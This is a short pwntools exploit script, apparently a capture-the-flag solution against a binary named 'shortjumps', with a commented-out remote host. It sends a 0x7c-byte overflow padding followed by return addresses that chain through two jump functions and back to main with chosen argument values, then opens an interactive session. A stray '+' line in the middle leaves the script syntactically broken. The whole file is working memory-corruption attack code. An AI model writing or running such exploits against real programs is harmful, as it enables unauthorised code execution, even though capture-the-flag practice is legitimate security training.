from pwn import *
context.log_level       = "DEBUG"
context.arch            = "amd64"
p = process("./shortjumps")
#p = remote("146.190.115.228", 9993)
gdb.attach(p,api=True)
jmp2 = 0x080492e0
main = 0x08049378
jmp1 = 0x080492b4
p.sendline(b"a")
p.sendlineafter(b"dream?", b"Y")
payload = b"a"*0x7c + p32(jmp1) + p32(main) + p32(0xdeadbeef) 
p.sendline(payload)

+
p.sendline(b"a")
p.sendlineafter(b"dream?", b"Y")
payload = b"a"*0x7c + p32(jmp2) + p32(main) + p32(0xcafebabe) + p64(0xFFFFFFFF48385879) 
p.sendline(payload)
p.interactive()

